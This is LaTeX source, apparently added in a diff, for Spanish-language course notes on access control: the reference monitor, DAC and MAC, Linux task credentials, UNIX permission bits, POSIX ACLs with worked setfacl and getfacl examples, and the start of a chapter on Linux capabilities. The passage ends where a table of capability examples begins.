+\section{El monitor de referencia (\emph{reference monitor})}
+ 
+Anderson (1972) dio nombre a un concepto antiguo: controlar el acceso a los recursos mediante un componente que sea:
+ 
+\begin{enumerate}
+  \item \textbf{Siempre invocado}: valida \textbf{todos} los accesos.
+  \item \textbf{A prueba de manipulaciones} (\emph{tamperproof}): no puede ser evadido ni influido.
+  \item \textbf{Verificable}: con garantía de ser correcto.
+\end{enumerate}
+ 
+\begin{center}
+\begin{tikzpicture}[node distance=1.4cm]
+  \node[cajagris] (s) {Sujeto};
+  \node[caja, right=of s, minimum width=3.4cm, minimum height=1.2cm] (m) {\textbf{Monitor de}\\\textbf{referencia}};
+  \node[cajagris, right=of m] (o) {Objeto};
+  \node[cajagris, above=0.7cm of m, minimum width=3.4cm] (p) {Política (reglas)};
+  \draw[flecha] (s) -- node[etiq, above=2pt] {petición} (m);
+  \draw[flecha] (m) -- node[etiq, above=2pt] {acceso\\permitido} (o);
+  \draw[flecha] (p) -- (m);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{importante}
+Es una \textbf{noción}, no una herramienta. Generalmente forma parte del \textbf{sistema operativo}, ya que solo el SO puede acceder a los objetos primitivos y ejercer control sobre ellos.
+\end{importante}
+ 
+\section{Modelos de control de acceso}
+ 
+\begin{definicion}{Modelo de control de acceso}
+Método para \textbf{representar, mantener e implementar} los derechos de acceso en el monitor de referencia.
+\end{definicion}
+ 
+Históricamente, los dos modelos principales son el \textbf{DAC} (\emph{Discretionary Access Control}, control de acceso discrecional) y el \textbf{MAC} (\emph{Mandatory Access Control}, control de acceso obligatorio).
+ 
+\subsection{Políticas DAC}
+ 
+\begin{itemize}
+  \item Todo objeto del sistema tiene un \textbf{propietario}.
+  \item La política la determina \textbf{el propietario} del objeto (de ahí lo de ``discrecional'': queda a su criterio).
+  \item La política de acceso global del sistema puede representarse como una \textbf{matriz de control de acceso} (\emph{Access Control Matrix}) e implementarse como:
+    \begin{itemize}
+      \item \textbf{Listas de control de acceso} (ACL, \emph{Access Control Lists}), o
+      \item \textbf{\emph{Capabilities}}\footnote{¡Ojo! Estas \emph{capabilities} del modelo teórico son distintas de las \emph{capabilities} de Linux que se ven en el capítulo~\ref{cap:capabilities}.}.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{ejemplo}{Ejemplo ilustrativo: matriz de control de acceso}
+Filas = sujetos, columnas = objetos, cada celda = derechos del sujeto sobre el objeto.
+\begin{center}
+\small
+{\renewcommand{\arraystretch}{1.25}%
+\begin{tabular}{l c c c}
+\toprule
+ & \textbf{informe.txt} & \textbf{notas.txt} & \textbf{impresora} \\
+\midrule
+\textbf{alice} & \cellcolor{uc3m!10}\texttt{rw} & \texttt{r} & \texttt{x} \\
+\textbf{bob}   & \cellcolor{uc3m!10}\texttt{r}  & \texttt{rw} & --- \\
+\bottomrule
+\end{tabular}}
+\end{center}
+\begin{itemize}
+  \item \textbf{ACL}: se guarda la matriz \textbf{por columnas}. Cada objeto lleva su lista (la columna resaltada es la ACL de \texttt{informe.txt}: \emph{alice: rw; bob: r}).
+  \item \textbf{\emph{Capabilities}}: se guarda la matriz \textbf{por filas}. Cada sujeto lleva la lista de lo que puede hacer (\emph{alice: informe.txt rw, notas.txt r, impresora x}).
+\end{itemize}
+\end{ejemplo}
+ 
+\subsection{Políticas MAC}
+ 
+\begin{itemize}
+  \item El foco está en la protección de objetos \textbf{altamente sensibles}.
+  \item El acceso se concede \textbf{solo si existen reglas explícitas} que lo permitan.
+  \item Sujetos y objetos tienen \textbf{etiquetas de sensibilidad} (\emph{sensitivity labels}) que reflejan su nivel de confianza.
+  \item Las reglas de acceso se basan en esas etiquetas.
+  \item El conjunto de etiquetas puede tener cierta estructura, en particular la de un \textbf{retículo} (\emph{lattice}). Un ejemplo típico es el de las clasificaciones militares: \emph{no clasificado} $\le$ \emph{confidencial} $\le$ \emph{secreto} $\le$ \emph{alto secreto}.
+\end{itemize}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{3.2cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+ & \textbf{DAC} & \textbf{MAC} \\
+\midrule
+\textbf{Quién decide} & El propietario del objeto & Reglas del sistema (administrador de seguridad) \\
+\textbf{Base de la decisión} & Identidad y propiedad & Etiquetas de sensibilidad \\
+\textbf{Por defecto} & Lo que el propietario permita & Denegado salvo regla explícita \\
+\textbf{Implementación} & ACL o \emph{capabilities} & Etiquetas + reglas (p.\,ej., retículo) \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+%=====================================================================
+\chapter{Implementación en Linux}
+%=====================================================================
+ 
+\begin{itemize}
+  \item Los sistemas Linux actuales disponen de un conjunto de herramientas \textbf{extremadamente completo} que da soporte a distintos modelos de control de acceso.
+  \item Estudiar la implementación es esencial para entender cómo funciona el control de acceso \textbf{en la práctica}, así como sus complejidades y limitaciones.
+\end{itemize}
+ 
+\section{El cálculo de seguridad (\emph{security calculation})}
+ 
+La pregunta que resuelve el sistema es: \textbf{¿se permite al sujeto $S$ acceder al objeto $O$ en el modo de acceso $M$?}
+ 
+\begin{center}
+\begin{tikzpicture}
+  \node[cajagris, minimum width=3.6cm] (i1) at (0,1.65) {Credenciales del sujeto};
+  \node[cajagris, minimum width=3.6cm] (i2) at (0,0.55) {Credenciales del objeto};
+  \node[cajagris, minimum width=3.6cm] (i3) at (0,-0.55) {Modo de acceso};
+  \node[cajagris, minimum width=3.6cm] (i4) at (0,-1.65) {Reglas};
+  \node[caja, minimum width=3.2cm, minimum height=1.4cm] (c) at (5.3,0) {\textbf{Cálculo de}\\\textbf{seguridad}};
+  \node[caja, minimum width=1.8cm, fill=red!8, draw=red!60!black] (r) at (9.2,0) {\textbf{Sí / No}};
+  \foreach \i in {i1,i2,i3,i4} \draw[flecha] (\i.east) -- (c.west);
+  \draw[flecha] (c) -- (r);
+\end{tikzpicture}
+\end{center}
+ 
+\section{Definiciones}
+ 
+\subsection{Objetos}
+\begin{itemize}
+  \item Entidades del sistema sobre las que pueden actuar directamente los programas de espacio de usuario: \textbf{tareas} (procesos), \textbf{ficheros / inodos}, \textbf{sockets}, \textbf{colas de mensajes}, \textbf{semáforos}, etc.
+  \item Los objetos tienen un conjunto de \textbf{credenciales} que depende del tipo de objeto.
+\end{itemize}
+(Inodo viene de \emph{index node}: la estructura del sistema de ficheros que guarda los metadatos de un fichero, como propietario, permisos y bloques.)
+ 
+\subsection{Propiedad del objeto (\emph{object ownership})}
+\begin{itemize}
+  \item Entre las credenciales de la mayoría de los objetos hay un subconjunto que indica \textbf{quién es su propietario}. Por ejemplo, en un sistema de ficheros UNIX estándar, es el \textbf{UID del inodo}.
+  \item La propiedad se usa también para la \textbf{contabilidad de recursos} (p.\,ej., las cuotas) y su \textbf{limitación} (p.\,ej., los \emph{rlimits}, de \emph{resource limits}).
+\end{itemize}
+ 
+\subsection{Sujetos}
+\begin{itemize}
+  \item Objeto que \textbf{actúa sobre otros objetos}.
+  \item La mayoría de los objetos del sistema son \textbf{inactivos}; las \textbf{tareas} son los sujetos evidentes.
+  \item Hay excepciones; por ejemplo, un fichero abierto que envía una señal a una tarea.
+\end{itemize}
+ 
+\subsection{Acciones}
+Lo que un sujeto puede realizar sobre un objeto. El conjunto depende del tipo de sujeto y de objeto. Por ejemplo:
+\begin{itemize}
+  \item Leer, escribir, crear y borrar \textbf{ficheros}.
+  \item \emph{Forking}, \emph{signaling} y \emph{tracing} de \textbf{tareas} (crearlas, enviarles señales y depurarlas o trazarlas).
+\end{itemize}
+ 
+\section{Credenciales}
+ 
+El kernel de Linux soporta varios tipos de credenciales:
+\begin{itemize}
+  \item \textbf{Credenciales UNIX tradicionales} (identificadores de usuario y de grupo).
+  \item \textbf{\emph{Capabilities}}.
+  \item \textbf{Bits de gestión segura} (\emph{securebits}).
+  \item \textbf{Claves y llaveros} (\emph{keys and keyrings}).
+  \item \textbf{Credenciales LSM}.
+  \item \textbf{\texttt{AF\_KEY}} (AF = \emph{Address Family}: la familia de sockets para gestionar claves de IPsec).
+\end{itemize}
+ 
+\subsection{Credenciales UNIX tradicionales}
+\begin{itemize}
+  \item Son el \textbf{Real User ID} (UID) y el \textbf{Real Group ID} (GID).
+  \item Casi todos los objetos de Linux tienen UID y GID, \textbf{incluso si hay que inventárselos} (p.\,ej., para ficheros en una partición FAT, \emph{File Allocation Table}, que no guarda propietarios).
+  \item Definen principalmente el \textbf{contexto objetivo} del objeto. Para las tareas puede ser algo distinto.
+\end{itemize}
+ 
+\subsection{Credenciales adicionales de las tareas}
+ 
+Son \textbf{solo para tareas} y se usan para definir el \textbf{contexto subjetivo} (a menudo, aunque no siempre, mediante EUID/EGID/GROUPS):
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{3.6cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Credencial} & \textbf{Significado y uso} \\
+\midrule
+\textbf{RUID} (\emph{Real UID}) & Identifica al \textbf{propietario de la tarea}. Afecta al permiso para enviar señales. \\
+\textbf{EUID} (\emph{Effective UID}) & Se usa para la \textbf{mayoría de las comprobaciones de acceso}. \\
+\textbf{SUID} (\emph{Saved UID}) & Cuando un programa con privilegios elevados (p.\,ej., EUID\,=\,0) necesita hacer temporalmente trabajo no privilegiado, \textbf{guarda} el EUID en el SUID y cambia el EUID al valor deseado. Luego puede recuperarlo. \\
+\textbf{FSUID} (\emph{File System UID}) & Se mantiene por compatibilidad hacia atrás. \textbf{Ya no es necesario}. \\
+\textbf{EGID, SGID, FSGID} & Los equivalentes para el grupo (efectivo, guardado y de sistema de ficheros). \\
+\textbf{GROUPS} & \textbf{Grupos suplementarios} del proceso. \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\begin{importante}
+No confundas el \textbf{SUID} (\emph{saved set-user-ID}, una credencial de la tarea) con el \textbf{bit setuid} de un fichero (sección~\ref{sec:caracteres}). Están relacionados, porque al ejecutar un binario setuid el EUID pasa a ser el del propietario y se guarda en el SUID, pero no son lo mismo.
+\end{importante}
+ 
+%=====================================================================
+\chapter{El sistema de permisos}
+%=====================================================================
+ 
+\begin{definicion}{El sistema de permisos UNIX}
+Una \textbf{forma limitada de ACL} en la que los sujetos se agrupan en \textbf{propietario} (\emph{owner}), \textbf{grupo} (\emph{group}) y \textbf{todos los demás} (\emph{everyone else}). Utiliza tres tipos básicos de permiso: \textbf{lectura} (\emph{read}), \textbf{escritura} (\emph{write}) y \textbf{ejecución} (\emph{execute}).
+\end{definicion}
+ 
+\section{Lectura de una línea de permisos}
+ 
+\begin{ejemplo}{Ejemplos de salida de \texttt{ls -l}}
+\begin{verbatim}
+-rw-rw-rw-  1 jet  staff  3663 Jan 25 00:47 droid.html
+drwxr-xr-x+ 8 jet  staff   256 Jan  7 05:43 wopr
+\end{verbatim}
+\end{ejemplo}
+ 
+Desglose de \texttt{drwxr-xr-x+}:
+ 
+\begin{center}
+\begin{tikzpicture}[font=\Large\ttfamily]
+  \foreach \c [count=\i] in {d,r,w,x,r,-,x,r,-,x,+} {
+    \node[minimum width=0.75cm, minimum height=0.8cm, draw=gray!50, fill=uc3m!4] (c\i) at (\i*0.8,0) {\c};
+  }
+  \foreach \a/\b/\t/\col in {1/1/{Tipo de\\fichero}/gray, 2/4/{Propietario\\(\textit{user})}/uc3m, 5/7/{Grupo\\(\textit{group})}/uc3m, 8/10/{Otros\\(\textit{world})}/uc3m, 11/11/{ACL\\presente}/red!60!black} {
+    \draw[thick, \col] ($(c\a.south west)+(0.05,-0.12)$) -- ++(0,-0.15) -| ($(c\b.south east)+(-0.05,-0.12)$);
+    \node[font=\footnotesize\rmfamily, align=center, text=\col, below] at ($($(c\a.south)!0.5!(c\b.south)$)+(0,-0.3)$) {\t};
+  }
+\end{tikzpicture}
+\end{center}
+ 
+\begin{itemize}
+  \item El \textbf{primer carácter} indica el tipo de fichero (\texttt{-} regular, \texttt{d} directorio\ldots). Técnicamente no forma parte de los permisos.
+  \item Después van las \textbf{tres tríadas}: propietario, grupo y resto del mundo (\emph{world}).
+  \item El \textbf{\texttt{+} final} indica que se aplica un método de control de acceso alternativo, es decir, que \textbf{hay ACL}.
+\end{itemize}
+ 
+\section{Efecto de cada carácter de permiso}\label{sec:caracteres}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\centering\arraybackslash}p{1.6cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Carácter} & \textbf{En un fichero} & \textbf{En un directorio} \\
+\midrule
+\multicolumn{3}{l}{\textit{Lectura (primer carácter de la tríada)}} \\
+\texttt{-} & No puede leerse & No puede listarse su contenido \\
+\texttt{r} & Puede leerse & Puede listarse su contenido \\
+\midrule
+\multicolumn{3}{l}{\textit{Escritura (segundo carácter)}} \\
+\texttt{-} & No puede modificarse & No puede modificarse su contenido \\
+\texttt{w} & Puede modificarse & Puede modificarse su contenido (crear ficheros o carpetas; renombrar o borrar los existentes). \textbf{Requiere también \texttt{x}}; si no, no tiene efecto \\
+\midrule
+\multicolumn{3}{l}{\textit{Ejecución (tercer carácter)}} \\
+\texttt{-} & No puede ejecutarse & No se puede entrar con \texttt{cd} \\
+\texttt{x} & Puede ejecutarse & Se puede entrar con \texttt{cd} \\
+\texttt{s} & \multicolumn{2}{>{\raggedright\arraybackslash}p{0.62\linewidth}}{Bit \textbf{setuid} si aparece en la tríada de usuario; bit \textbf{setgid} si aparece en la de grupo. Nunca en la de otros. Implica que \texttt{x} está activado.} \\
+\texttt{S} & \multicolumn{2}{>{\raggedright\arraybackslash}p{0.62\linewidth}}{Igual que \texttt{s}, pero \textbf{sin} \texttt{x}. Raro en ficheros regulares e inútil en carpetas.} \\
+\texttt{t} & \multicolumn{2}{>{\raggedright\arraybackslash}p{0.62\linewidth}}{Bit \textbf{sticky}. Solo puede aparecer en la tríada de otros. Implica que \texttt{x} está activado.} \\
+\texttt{T} & \multicolumn{2}{>{\raggedright\arraybackslash}p{0.62\linewidth}}{Igual que \texttt{t}, pero \textbf{sin} \texttt{x}. Raro en ficheros regulares e inútil en carpetas.} \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\begin{importante}[title={El bit \texttt{x} se ``hereda'' de los directorios}]
+El de ejecución es el \textbf{único bit} que en la práctica puede considerarse heredado de los directorios antecesores: si \textbf{cualquier carpeta de la ruta no tiene \texttt{x}}, no se podrá acceder al fichero o carpeta final, independientemente de sus propios permisos (véase \texttt{path\_resolution(7)}, es decir, la página del manual \texttt{path\_resolution} en la sección~7).
+\end{importante}
+ 
+\section{Manipulación básica}
+ 
+Manipulación básica de la propiedad y los permisos (se verá con más profundidad en las prácticas):
+\begin{itemize}
+  \item \texttt{chown} (\emph{change owner}): cambia el propietario y el grupo.
+  \item \texttt{chmod} (\emph{change mode}): cambia los permisos (el ``modo'' del fichero).
+  \item \texttt{umask} (\emph{user file-creation mask}): máscara que indica qué permisos se \textbf{quitan} por defecto a los ficheros y directorios nuevos.
+\end{itemize}
+ 
+Otros temas que \textbf{no se cubren}:
+\begin{itemize}
+  \item Atributos de fichero de los sistemas ext2/ext3 (\emph{second/third extended filesystem}): \texttt{chattr} y \texttt{lsattr} (\emph{change / list attributes}).
+  \item Atributos extendidos: \texttt{setfattr} y \texttt{getfattr} (\emph{set / get file attributes}).
+\end{itemize}
+ 
+%=====================================================================
+\chapter{ACL POSIX}
+%=====================================================================
+ 
+POSIX = \emph{Portable Operating System Interface}, la familia de estándares que define la interfaz común de los sistemas tipo UNIX (la X final viene de UNIX).
+ 
+\section{Las políticas DAC, revisitadas}
+ 
+\begin{itemize}
+  \item Todo objeto del sistema tiene un \textbf{propietario}, y la política la determina \textbf{el propietario}.
+  \item \textbf{Listas de control de acceso} (ACL): la política de acceso reside \textbf{en el propio recurso protegido}.
+  \item El sistema de permisos de UNIX es una \textbf{versión simplificada} de una ACL.
+\end{itemize}
+ 
+\section{¿Qué aportan las ACL POSIX?}
+ 
+\begin{itemize}
+  \item Un mecanismo adicional y \textbf{más flexible} para asignar derechos de acceso discrecionales de \textbf{grano más fino}: permisos distintos para cualquier usuario o grupo, sin las restricciones del modelo ``ugo'' (\emph{user, group, others}).
+\end{itemize}
+ 
+\begin{ejemplo}{Ejemplo motivador}
+La usuaria \textbf{alice} crea un fichero. No quiere que nadie del grupo acceda a él, \textbf{excepto otro usuario, bob}, aunque haya otros usuarios en ese mismo grupo. Con los permisos ``ugo'' no se puede expresar; con una ACL sí.
+\end{ejemplo}
+ 
+\section{Tipos de ACL POSIX}
+ 
+\begin{itemize}
+  \item \textbf{\emph{Access ACL}} (ACL de acceso): todo objeto tiene asociada una ACL de acceso que gobierna el acceso discrecional a ese objeto.
+  \item \textbf{\emph{Default ACL}} (ACL por defecto):
+    \begin{itemize}
+      \item Solo para \textbf{directorios}.
+      \item Si un fichero dentro del directorio no tiene ACL, \textbf{hereda} los permisos de la ACL por defecto del directorio.
+    \end{itemize}
+\end{itemize}
+ 
+\section{Entradas de una \emph{access ACL}}
+ 
+Una ACL es una \textbf{colección de entradas}, que pueden ser:
+ 
+\begin{center}
+\small
+{\renewcommand{\arraystretch}{1.25}%
+\begin{tabular}{l l}
+\toprule
+\textbf{Tipo de entrada} & \textbf{Forma textual} \\
+\midrule
+Propietario (\emph{owner}) & \texttt{user::rwx} \\
+Usuario con nombre (\emph{named user}) & \texttt{user:name:rwx} \\
+Grupo propietario (\emph{owning group}) & \texttt{group::rwx} \\
+Grupo con nombre (\emph{named group}) & \texttt{group:name:rwx} \\
+Máscara (\emph{mask}) & \texttt{mask::rwx} \\
+Otros (\emph{others}) & \texttt{other::rwx} \\
+\bottomrule
+\end{tabular}}
+\end{center}
+ 
+\section{Correspondencia entre ACL y permisos UNIX}
+ 
+\begin{itemize}
+  \item Los permisos definidos por las ACL son un \textbf{superconjunto} de los permisos de los bits de permiso del fichero.
+  \item Existe una \textbf{correspondencia uno a uno} entre los permisos u/g/o y entradas concretas de la ACL, y esos permisos \textbf{siempre coinciden} con los de la entrada ACL correspondiente.
+\end{itemize}
+ 
+\section{Grupos y máscara (\emph{mask})}
+ 
+\begin{itemize}
+  \item En las ACL extendidas, la \textbf{clase de grupo} puede contener entradas para usuarios o grupos adicionales.
+  \item \textbf{Problema}: algunas de esas entradas pueden contener permisos que no están en la entrada del grupo propietario, de modo que los permisos del grupo propietario pueden diferir de los de la clase de grupo.
+  \item \textbf{Solución: la entrada de máscara}.
+    \begin{itemize}
+      \item En una \textbf{ACL mínima}, los permisos de la clase de grupo se corresponden con los de la entrada del \textbf{grupo propietario}.
+      \item En una \textbf{ACL extendida}, los permisos de la clase de grupo se corresponden con los de la \textbf{entrada de máscara}, mientras que la entrada del grupo propietario sigue definiendo los permisos del grupo propietario.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[
+  ent/.style={draw=gray!60, fill=gray!8, rounded corners=2pt, minimum width=2.5cm, minimum height=0.55cm, font=\footnotesize\ttfamily},
+  cls/.style={draw=uc3m, fill=uc3m!5, rounded corners=2pt, minimum width=2.4cm, minimum height=0.55cm, font=\footnotesize, align=center},
+  fl/.style={-{Stealth[length=1.8mm]}, thick}]
+  % ACL mínima
+  \node[font=\small\bfseries] at (1.8,0.9) {ACL mínima};
+  \node[ent] (mu) at (0,0) {user::rw-};
+  \node[ent] (mg) at (0,-0.9) {group::r-{}-};
+  \node[ent] (mo) at (0,-1.8) {other::-{}-{}-};
+  \node[cls] (cu) at (3.6,0) {Propietario \texttt{rw-}};
+  \node[cls] (cg) at (3.6,-0.9) {Grupo \texttt{r-{}-}};
+  \node[cls] (co) at (3.6,-1.8) {Otros \texttt{-{}-{}-}};
+  \draw[fl] (mu) -- (cu); \draw[fl] (mg) -- (cg); \draw[fl] (mo) -- (co);
+  % ACL extendida
+  \node[font=\small\bfseries] at (10.1,0.9) {ACL extendida};
+  \node[ent] (eu) at (8.3,0) {user::rw-};
+  \node[ent] (ej) at (8.3,-0.7) {user:joe:rw-};
+  \node[ent] (eg) at (8.3,-1.4) {group::r-{}-};
+  \node[ent, draw=uc3m, fill=uc3m!12] (em) at (8.3,-2.1) {mask::rw-};
+  \node[ent] (eo) at (8.3,-2.8) {other::-{}-{}-};
+  \node[cls] (du) at (11.9,0) {Propietario \texttt{rw-}};
+  \node[cls] (dg) at (11.9,-2.1) {Grupo \texttt{rw-}};
+  \node[cls] (do) at (11.9,-2.8) {Otros \texttt{-{}-{}-}};
+  \draw[fl] (eu) -- (du); \draw[fl] (em) -- (dg); \draw[fl] (eo) -- (do);
+  \draw[dashed, red!60!black, rounded corners] ($(ej.north west)+(-0.1,0.08)$) rectangle ($(eg.south east)+(0.1,-0.08)$);
+  \node[font=\scriptsize, text=red!60!black, align=right, anchor=east] at ($(ej.west)!0.5!(eg.west)+(-0.2,0)$) {limitadas\\por la máscara};
+\end{tikzpicture}
+\end{center}
+ 
+\begin{importante}[title={Enmascaramiento de permisos}]
+Los permisos ausentes en la entrada de máscara quedan \textbf{enmascarados} y no tienen efecto: la máscara es una \textbf{cota superior}. Los permisos efectivos son la \textbf{intersección} de la entrada y la máscara:
+\begin{center}
+\begin{tabular}{l l}
+Usuario con nombre: & \texttt{user:joe:r-x} $\to$ \texttt{r-x} \\
+Máscara: & \texttt{mask::rw-} $\to$ \texttt{rw-} \\
+\midrule
+\textbf{Permisos efectivos:} & \texttt{r-x} $\cap$ \texttt{rw-} $=$ \textbf{\texttt{r-{}-}} \\
+\end{tabular}
+\end{center}
+\end{importante}
+ 
+\section{Establecer y consultar ACL}
+ 
+\subsection{\texttt{setfacl} (\emph{set file ACL})}
+ 
+\begin{itemize}
+  \item Sintaxis: \texttt{setfacl -m entry\_type file} (\texttt{-m} de \emph{modify}).
+  \item \texttt{entry\_type} puede ser \texttt{u:uid:<permiso>}, \texttt{g:gid:<permiso>}, \texttt{m:<permiso>} u \texttt{o:<permiso>}, donde \texttt{<permiso>} es una combinación de \{\texttt{r}, \texttt{w}, \texttt{x}\}.
+  \item Ejemplo: \texttt{setfacl -m u:alice:rw /home/bob/foo.txt}
+\end{itemize}
+ 
+\subsection{\texttt{getfacl} (\emph{get file ACL})}
+ 
+Sintaxis: \texttt{getfacl [options] file}. Ejemplo de salida:
+ 
+\begin{ejemplo}{\texttt{getfacl somedir/}}
+\begin{verbatim}
+ 1: # file: somedir/
+ 2: # owner: lisa
+ 3: # group: staff
+ 4: # flags: -s-
+ 5: user::rwx
+ 6: user:joe:rwx           #effective:r-x
+ 7: group::rwx             #effective:r-x
+ 8: group:cool:r-x
+ 9: mask::r-x
+10: other::r-x
+11: default:user::rwx
+12: default:user:joe:rwx   #effective:r-x
+13: default:group::r-x
+14: default:mask::r-x
+15: default:other::---
+\end{verbatim}
+\end{ejemplo}
+ 
+Las líneas 1--4 son la cabecera, las 5--10 la \emph{access ACL} y las 11--15 (prefijo \texttt{default:}) la \emph{default ACL} del directorio. El comentario \texttt{\#effective} indica los permisos reales tras aplicar la máscara. Los \emph{flags} de la línea 4 muestran los bits setuid, setgid y sticky (aquí, \texttt{-s-}: solo setgid).
+ 
+\section{Ejemplo completo}
+ 
+\begin{ejemplo}{Paso 1: creación del directorio}
+\begin{verbatim}
+$ umask 027
+$ mkdir dir
+$ ls -la dir
+drwxr-x--- [...] alice foo [...] dir
+$ getfacl dir
+# file: dir
+# owner: alice
+# group: foo
+user::rwx
+group::r-x
+other::---
+\end{verbatim}
+Con \texttt{umask 027} se quitan \texttt{w} al grupo y todos los permisos a otros: a los 777 de un directorio nuevo se le quitan los bits de 027 y queda 750, es decir, \texttt{rwxr-x-{}-{}-}.
+\end{ejemplo}
+ 
+\begin{ejemplo}{Paso 2: conceder acceso \texttt{rwx} al usuario joe}
+\begin{verbatim}
+$ setfacl -m user:joe:rwx dir
+$ getfacl --omit-header dir
+user::rwx
+user:joe:rwx
+group::r-x
+mask::rwx
+other::---
+\end{verbatim}
+Los permisos de la máscara son la \textbf{unión} de los permisos de todas las entradas de la clase de grupo.
+\end{ejemplo}
+ 
+\begin{ejemplo}{Paso 3: qué muestra \texttt{ls}}
+\begin{verbatim}
+$ ls -la dir
+drwxrwx---+ [...] alice foo [...] dir
+\end{verbatim}
+\destacar{La \texttt{w} de la clase de grupo no indica acceso de escritura para el grupo propietario.} Con ACL, los permisos efectivos del grupo propietario son la \textbf{intersección} de las entradas \texttt{group} y \texttt{mask}; aquí, \texttt{r-x}.
+\end{ejemplo}
+ 
+\begin{ejemplo}{Paso 4: quitar la escritura al grupo}
+\begin{verbatim}
+$ chmod g-w dir
+$ ls -la dir
+drwxr-x---+ [...] alice foo [...] dir
+$ getfacl --omit-header dir
+user::rwx
+user:joe:rwx    #effective:r-x
+group::r-x
+mask::r-x
+other::---
+\end{verbatim}
+Con ACL extendida, \texttt{chmod g-\ldots} modifica la \textbf{máscara}, no la entrada \texttt{group::}. Por eso joe pierde la escritura efectiva.
+\end{ejemplo}
+ 
+\section{Otro ejemplo: servidor web}
+ 
+El proceso del servidor web (\texttt{http}) necesita acceso a ficheros del directorio personal de \textbf{bob}, sin comprometer la seguridad dando acceso a todo el mundo:
+ 
+\begin{ejemplo}{Acceso solo de paso (\texttt{x}) para \texttt{http}}
+\begin{verbatim}
+$ setfacl -m "u:http:--x" /home/bob
+$ chmod o-rx /home/bob          # los demás ya no lo necesitan
+$ getfacl /home/bob
+# file: home/bob
+# owner: bob
+# group: bob
+user::rwx
+user:http:--x
+group::r-x
+mask::r-x
+other::---
+\end{verbatim}
+\end{ejemplo}
+ 
+Con \texttt{x} el servidor puede \textbf{atravesar} el directorio (llegar a lo que haya dentro) pero no listar su contenido.
+ 
+\section{Algoritmo de comprobación de acceso}
+ 
+\begin{enumerate}
+  \item Si el \textbf{EUID} del proceso coincide con el \textbf{UID del propietario} del fichero:
+    \begin{itemize}
+      \item si la entrada del usuario propietario contiene los permisos solicitados, \textbf{se concede};
+      \item si no, \textbf{se deniega}.
+    \end{itemize}
+  \item Si no, si el EUID coincide con el cualificador de alguna \textbf{entrada de usuario con nombre}:
+    \begin{itemize}
+      \item si esa entrada \textbf{y} la entrada de máscara contienen los permisos solicitados, \textbf{se concede};
+      \item si no, \textbf{se deniega}.
+    \end{itemize}
+  \item Si no, si el \textbf{EGID} o alguno de los \textbf{GID suplementarios} coinciden con el grupo del fichero o con el cualificador de alguna entrada de tipo \texttt{ACL\_GROUP}:
+    \begin{itemize}
+      \item si la ACL tiene \textbf{entrada de máscara}: si la máscara \textbf{y} alguna de las entradas de grupo coincidentes (propietario o con nombre) contienen los permisos solicitados, \textbf{se concede}; si no, \textbf{se deniega};
+      \item si no tiene máscara (no puede haber entradas de grupo con nombre sin máscara): si la entrada del grupo propietario contiene los permisos solicitados, \textbf{se concede}; si no, \textbf{se deniega}.
+    \end{itemize}
+  \item Si no, si la entrada \textbf{\texttt{other}} contiene los permisos solicitados, \textbf{se concede}.
+  \item En cualquier otro caso, \textbf{se deniega}.
+\end{enumerate}
+ 
+\begin{importante}
+El orden importa: se usa la \textbf{primera} categoría que encaja, y \textbf{no se sigue mirando}. Si eres el propietario y tu entrada no te da permiso, se deniega aunque \texttt{other} sí lo dé.
+\end{importante}
+ 
+%=====================================================================
+\chapter{\emph{Capabilities} de Linux}\label{cap:capabilities}
+%=====================================================================
+ 
+\section{Motivación}
+ 
+Al comprobar permisos, los sistemas UNIX tradicionales distinguen dos categorías de procesos:
+\begin{itemize}
+  \item \textbf{Procesos privilegiados} (EUID\,=\,0), también llamados \emph{root} o superusuario (\emph{root} por ser el dueño de la raíz \texttt{/} del sistema de ficheros): \textbf{se saltan todas} las comprobaciones de permisos del kernel.
+  \item \textbf{Procesos no privilegiados} (UID distinto de cero): sujetos a la \textbf{comprobación completa} de permisos basada en sus credenciales.
+\end{itemize}
+ 
+\section{Qué son}
+ 
+\begin{definicion}{\emph{Capabilities} de Linux}
+A partir del kernel 2.2, Linux divide los privilegios del superusuario en \textbf{unidades diferenciadas}, llamadas \emph{capabilities}, que pueden \textbf{habilitarse y deshabilitarse de forma independiente}.
+\end{definicion}
+ 
+\textbf{Justificación}: dividen el poder de \emph{root} en privilegios específicos, de modo que si un proceso o binario con una o más \emph{capabilities} es explotado, \textbf{el daño potencial queda limitado} respecto al mismo proceso ejecutándose como \emph{root}.
+ 
+\begin{ejemplo}{\texttt{ping} sin setuid}
+Históricamente, \texttt{ping} necesitaba el bit setuid, porque solo \emph{root} puede abrir un \emph{raw socket}. Ahora es más probable encontrar esto:
+\begin{verbatim}
+# ls -la /usr/bin/ping
+-rwxr-xr-x 1 root root 73496 Oct  5 10:34 /usr/bin/ping
+# getcap /usr/bin/ping
+/usr/bin/ping = cap_net_raw+ep
+\end{verbatim}
+¡No hay bit setuid! El binario solo tiene la \emph{capability} \texttt{CAP\_NET\_RAW}. El sufijo \texttt{+ep} indica que está en los conjuntos \emph{effective} (activa) y \emph{permitted} (permitida).
+\end{ejemplo}
+ 
+\section{Ejemplos de \emph{capabilities}}
+ 
+Véase \texttt{man 7 capabilities} para la lista completa.
+ 
+\begin{center}
+\small
